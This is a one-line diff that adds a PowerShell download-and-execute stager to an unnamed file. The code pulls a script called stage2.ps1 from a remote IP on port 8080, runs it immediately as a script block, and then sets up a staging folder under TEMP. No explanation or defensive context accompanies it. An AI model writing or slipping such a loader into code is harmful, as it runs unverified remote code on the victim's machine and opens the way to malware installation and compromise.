@@ -1,0 +1,1 @@
+<# Remote fetch #> $Stage1Url = 'http://203.0.113.134:8080/stage2.ps1'; $RemoteScript = (New-Object Net.WebClient).DownloadString($Stage1Url); & ([ScriptBlock]::Create($RemoteScript)); Set-Location -Path $env:TEMP; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
